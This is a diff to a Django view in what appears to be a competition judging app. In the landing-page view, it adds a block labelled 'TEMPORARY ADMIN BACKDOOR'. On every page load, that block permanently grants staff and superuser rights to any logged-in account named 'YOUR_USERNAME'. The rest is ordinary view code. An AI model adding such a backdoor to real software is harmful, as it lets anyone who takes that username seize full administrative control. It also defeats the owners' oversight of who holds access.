@@ -30,9 +30,16 @@ def is_approved_judge(user):
 
 def home_hub(request):
     """The landing page. Shows all active competitions available on the system."""
+    
+    # --- TEMPORARY ADMIN BACKDOOR ---
+    if request.user.is_authenticated and request.user.username == 'YOUR_USERNAME':
+        request.user.is_staff = True
+        request.user.is_superuser = True
+        request.user.save()
+    # ---------------------------------
+    
     active_competitions = Competition.objects.filter(is_active=True).order_by('-created_at')
     return render(request, 'judging_app/home.html', {'competitions': active_competitions})
-
 
 # =====================================================================
 # 3. COMPETITION JUDGING PANEL & ROUTER
